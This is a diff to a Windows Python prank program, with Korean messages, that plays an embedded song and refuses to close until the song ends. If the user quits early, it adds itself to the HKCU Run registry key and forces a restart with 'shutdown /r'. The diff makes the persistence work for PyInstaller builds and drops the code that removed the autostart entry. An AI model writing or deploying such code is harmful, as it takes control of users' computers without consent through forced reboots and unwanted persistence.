@@ -1,3 +1,5 @@
+# -*- coding: utf-8 -*-
+
 import os
 assert os.name == "nt", "윈도우에서만 작동합니다."
 
@@ -20,6 +22,14 @@ from tkinter import messagebox
 from io import BytesIO
 
 from sets import image_base64, audio_base64
+
+pyinstaller = False
+
+try:
+    with redirect_stdout(None):
+        print(__file__)
+except:
+    pyinstaller = True
 
 root = Tk()
 
@@ -49,7 +59,7 @@ key_value = r"Software\Microsoft\Windows\CurrentVersion\Run"
 
 def play_music():
     def _play_music():
-        global music_end, root
+        global music_end
         mixer.music.load(
             BytesIO(base64.b64decode(audio_base64))
         )
@@ -59,35 +69,22 @@ def play_music():
             pass
 
         music_end = True
-        messagebox.showinfo(":)", "노래를 끝까지 들으셨군요!")
-        messagebox.showinfo(":)", "노래의 저작권은 Snail's House (ujico)님에게 있습니다!")
 
-        try:
-            winreg.DeleteKeyEx(
-                key,
-                key_value,
-                winreg.KEY_ALL_ACCESS,
-                0
-            )
-        except:
-            pass
-
-        os._exit(0)
-
-    threading.Thread(target=_play_music).start()
+    threading.Thread(target=_play_music, daemon=True).start()
 
 def change_title():
     def _change_title():
         global root
 
-        a = 0
+        minute = 0
 
-        while True:
+        while 1:
             time.sleep(60)
-            a += 1
-            root.title(f"{a}분 지났어요...")
+            minute += 1
+            root.title(f"{minute}분 지났어요...")
             root.update()
-    threading.Thread(target=_change_title).start()
+
+    threading.Thread(target=_change_title, daemon=True).start()
 
 def on_exit():
     mixer.music.fadeout(3000)
@@ -102,11 +99,13 @@ def on_exit():
         messagebox.showwarning("...", "왜 노래를 끝까지 듣지 않으셨나요?")
         messagebox.showwarning("...", "컴퓨터를 재부팅 할 겁니다.")
         messagebox.showwarning("...", "그리고 다시 돌아와서 한번 더 노래를 듣게 할 겁니다.")
-        messagebox.showinfo(":(", "그럼 안녕")
-        winreg.SetValueEx(open_key, "ListenThisMusic", 0, winreg.REG_SZ, this_adress.replace(".pyw", ".exe"))
+        messagebox.showwarning(":(", "그럼 안녕")
+        winreg.SetValueEx(open_key, "ListenThisMusic", 0, winreg.REG_SZ, this_adress.replace(".pyw", ".exe") if pyinstaller else this_adress)
         winreg.CloseKey(open_key)
         os.system("shutdown /r")
         os._exit(1)
+
+    os._exit(0)
 
 open_spotify = lambda: webbrowser.open("https://open.spotify.com/track/4mCwspCTPF1aoWUNxsS5aD?si=c5d987f3f38a42bf")
 
@@ -118,7 +117,7 @@ listen_on_spotify = PhotoImage(master=root, data=image_base64)
 
 text = Label(root, text="이 노래를 끝까지 들어야 이 프로그램은 종료됩니다.", font=font.Font(root, size=16))
 song = Label(root, text="음악: Snail's House - Hot Milk", font=font.Font(root, size=12))
-spotify = Button(root, image=listen_on_spotify, bd=0, command=open_spotify)
+spotify = Button(root, image=listen_on_spotify, bd=0, command=open_spotify, cursor="hand1")
 
 play_music()
 change_title()
